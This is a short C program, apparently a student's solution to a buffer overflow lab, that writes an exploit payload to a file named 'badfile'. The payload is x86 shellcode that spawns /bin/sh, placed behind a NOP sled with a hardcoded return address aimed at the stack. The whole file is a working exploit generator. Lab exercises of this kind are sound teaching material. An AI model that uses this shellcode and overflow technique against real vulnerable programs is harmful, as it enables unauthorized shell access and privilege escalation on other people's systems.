#include <stdlib.h>
#include <stdio.h>
#include <string.h>
char shellcode[]=
    "\x31\xc0"
    "\x50"
    "\x68""//sh"
    "\x68""/bin"
    "\x89\xe3"
    "\x50"
    "\x53"
	"\x89\xe1"
	"\x99"
	"\xb0\x0b"
	"\xcd\x80"
;

void main(int argc, char **argv)
{
    char buffer[517];
    FILE *badfile;
    int size; 

    /*size = 25 for spointer*/
    size=sizeof(shellcode)/sizeof(char);
    printf("size=%d\n", size);


    /* Initbuffer with NOP instruction */
    memset(&buffer, 0x90, 517);

    /*starting address to fill the buffer*/
    /* part of templace code from pdf*/
    //long address = 0xbffff0f4; <-  gdb changed?
    long address = 0xbf9a8b58;
    long stpointer = address + 39;
    long *pointer = (long*)(buffer+25);
    *pointer=stpointer;

    /*this should fill the buffer with the shellcode*/

    memcpy(buffer+sizeof(buffer)- sizeof(shellcode), shellcode, sizeof(shellcode));


    

    /* Save the contents to the file "badfile" */
    badfile = fopen("./badfile", "w");
    fwrite(buffer, 517, 1, badfile);
    fclose(badfile);
}
